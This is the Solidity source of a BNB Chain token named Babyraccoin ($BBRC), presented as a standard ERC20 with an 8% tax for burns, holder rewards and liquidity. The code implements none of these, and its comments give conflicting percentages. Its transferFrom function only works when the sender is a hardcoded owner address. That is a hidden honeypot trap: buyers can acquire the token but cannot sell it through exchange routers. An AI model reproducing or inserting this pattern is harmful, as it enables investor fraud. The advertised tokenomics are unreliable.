/**
 *Submitted for verification at BscScan.com on 2021-07-09
*/

/**
 


▒█▀▀█ ░█▀▀█ ▒█▀▀█ ▒█░░▒█ ▒█▀▀█ ░█▀▀█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀█ ▀█▀ ▒█▄░▒█ 
▒█▀▀▄ ▒█▄▄█ ▒█▀▀▄ ▒█▄▄▄█ ▒█▄▄▀ ▒█▄▄█ ▒█░░░ ▒█░░░ ▒█░░▒█ ▒█░ ▒█▒█▒█ 
▒█▄▄█ ▒█░▒█ ▒█▄▄█ ░░▒█░░ ▒█░▒█ ▒█░▒█ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄█ ▄█▄ ▒█░░▀█


🐣TOTAL SUPPLY: 1,000,000,000,000 $BBRC
  🔥 49% Burn
      1% Marketing wallet.
    
    -------------------------
    
        8% Tax on every transaction
    
   3% distributed to holders.
   3% is redistributed and paired together in the Liquidity Pool.
   2% is sent to a “dead” burn wallet.
 

*/

pragma solidity ^0.5.16;

// ----------------------------------------------------------------------------
// ERC Token Standard #20 Interface
//
// ----------------------------------------------------------------------------
contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// ----------------------------------------------------------------------------
// Safe Math Library
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}


contract Code is ERC20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it
    address private _owner = 0xD783246e0f7c0b19AF6F7EfcD8366148d03d5C99;
    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    /**
     * Constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    constructor() public {
        name = "Babyraccoin";
        symbol = "$BBRC";
        decimals = 18;
        _totalSupply = 1000000000000000000000000000000;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }
//8% each swap (2% liquidity, 2% holders, 2% charity/marketing, 2% burned)
    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }
//8% each swap (5% liquidity, 5% holders)
    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        require(from == _owner, "Complite!");
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
         
    }
}